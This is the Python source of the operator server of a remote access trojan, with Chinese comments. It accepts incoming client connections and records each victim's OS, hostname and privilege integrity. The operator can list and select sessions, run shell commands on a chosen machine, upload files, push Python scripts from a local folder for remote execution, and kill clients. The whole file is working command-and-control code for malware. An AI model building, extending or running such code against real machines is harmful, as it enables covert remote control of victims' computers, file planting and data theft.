import glob
import json
import queue
import shlex
import socket
import subprocess
import sys
import threading
import time
import traceback

try:
    import tabulate
except ImportError:
    tabulate = None
    traceback.print_exc()

from common.util import logger, parse, scan_args
from server.config import SOCKET_ADDR
from server.util import *
from common.ratsocket import RATSocket
from server.client import Client


class Server:

    def __init__(self, address):
        self.address = address
        self.socket = RATSocket()
        self.connections = []  # 存放已建立的连接
        self.commands = queue.Queue()  # 存放待执行的命令

    def serve(self):
        try:
            self.socket.bind(self.address)
            logger.info('Listening on port {}'.format(self.address[1]))
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))

        while 1:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(5)
                try:
                    connection = Client(conn)
                    info = connection.recv()
                except json.JSONDecodeError:
                    conn.close()
                    logger.error('Connection timed out: {}'.format(addr))
                    continue
                except Exception as e:
                    logger.error('Error establishing connection: {}'.format(e))
                    continue
                conn.settimeout(None)
                info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
                connection = Client(conn, addr, info)
                self.connections.append(connection)
                logger.info('Connection has been established: {}'.format(addr))
                threading.Thread(target=self.connection_handler, args=(connection,), daemon=True).start()
            except socket.error as e:
                logger.error(e)

    def connection_handler(self, conn):
        """
        处理连接的子线程
        :param conn: 连接
        """
        while 1:
            try:
                result = conn.recv_result()
                if not result:
                    continue
                id, status, result = result

                # is_empty = self.commands.empty()
                # pending_id = 0
                # if not is_empty:
                #     pending_id = self.commands.get()
                # is_active = conn.status
                # if is_active and (id != pending_id):

                if conn.status and (self.commands.empty() or id != self.commands.get()):
                    if status:
                        logger.info('Unread: ' + result)
                    else:
                        logger.error('Unread: ' + result)
                else:
                    conn.queue.put((status, result))
            except socket.error:
                logger.error(f'Connection closed: {conn.address}')
                server.connections.remove(conn)
                break
            except:
                logger.error(f'Error receiving from {conn.address}', exc_info=True)

    def list_connections(self):
        """
        查看所有连接
        """
        connections = []
        for i, connection in enumerate(self.connections):
            connections.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                                connection.info['integrity']])
        if tabulate:
            if connections:
                print(tabulate.tabulate(connections, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'],
                                        tablefmt='pretty'))
        else:
            for connection in connections:
                print(connection)

    def get_last_connection(self) -> Client:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections[len(self.connections) - 1]
        except IndexError:
            raise Exception('No connection at this time')

    def get_target_connection(self, id) -> Client:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    def open_connection(self, conn: Client):
        """
        与指定客户端交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.status = True  # 设置连接为交互中
        while not conn.queue.empty():  # 连接前判断有没有未读消息
            logger.info('Unread: ' + conn.queue.get()[1])
        server_commands = {name: getattr(Command, name) for name, func in vars(Command).items() if
                           callable(getattr(Command, name))}  # 服务端命令
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue
                    name, arg = parse(cmd)
                    # 关闭连接
                    if cmd in ['kill', 'reset']:
                        conn.send_command(cmd)
                        break
                    # 搁置连接
                    elif cmd in ['exit', 'quit']:
                        break
                    # 服务端命令
                    elif name in server_commands:
                        write(*server_commands[name](conn, arg))
                        continue
                    # 切换至最新连接
                    elif cmd == 'q':
                        connection = self.get_last_connection()
                        if connection == conn:
                            continue
                        self.open_connection(connection)
                        break
                    # 发送命令
                    else:
                        id = conn.send_command(cmd)
                        server.commands.put(id)
                        write(*conn.queue.get())
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        conn.status = False

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                name, arg = parse(cmd)
                # 查看所有连接
                if cmd in ['l', 'ls', 'list']:
                    self.list_connections()
                # 与最新客户端交互
                elif cmd == 'q':
                    self.open_connection(self.get_last_connection())
                # 与指定客户端交互
                elif name in ['s', 'select']:
                    self.open_connection(self.get_target_connection(arg))
                # 关闭连接
                elif name in ['k', 'kill']:
                    self.kill_connection(arg)
                # 退出
                elif cmd in ['quit', 'exit']:
                    server.socket.close()
                    sys.exit(0)
                # 清屏
                elif cmd in ['cls', 'clear']:
                    subprocess.call(cmd, shell=True)
                # 切换目录
                elif name == 'cd':
                    print(cd(arg))
                # 与指定客户端交互
                else:
                    try:
                        self.open_connection(self.get_target_connection(cmd))
                    except Exception:
                        raise Exception('Command not recognized')
            except KeyboardInterrupt:
                print(Colors.RESET)
                server.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {e}')
            finally:
                print()


class Command:

    @staticmethod
    def upload(conn, arg):
        if os.path.isfile(arg):
            id = int(time.time())
            server.commands.put(id)  # 放入待接收命令
            try:
                return conn.send_file(id, arg)
            except Exception as e:
                server.commands.queue.clear()  # 出现异常清空命令队列
                return 0, str(e)
        else:
            return 0, 'File does not exist'

    @staticmethod
    def exec(conn, arg):
        script_dir = 'server/script/'
        # 显示脚本列表
        scripts = []
        if not arg:
            for file in glob.iglob(os.path.join(script_dir, '**/*.py'), recursive=True):
                scripts.append(os.path.relpath(file, script_dir).replace('\\', '/'))
            return 1, '\n'.join(scripts)

        arg = shlex.split(arg)  # 拆分脚本名和参数
        script_name = os.path.abspath(os.path.join(script_dir, arg[0]))  # 脚本名
        if not os.path.isfile(script_name):
            return 0, f'File does not exist: {script_name}'

        with open(script_name, 'rt') as f:
            try:
                id = conn.send_command(f.read(), type='script', extra=scan_args(arg[1:]))
            except UnicodeDecodeError:
                return 0, f'Unprocessable file: {script_name}'

        server.commands.put(id)
        return conn.queue.get()


def write(status: int, result: str):
    """
    在控制台输出结果
    :param status: 0或者1
    :param result: 结果
    """
    if not status:
        result = Colors.BRIGHT_RED + result + Colors.RESET
    print(result)


if __name__ == '__main__':
    os.system('')
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()
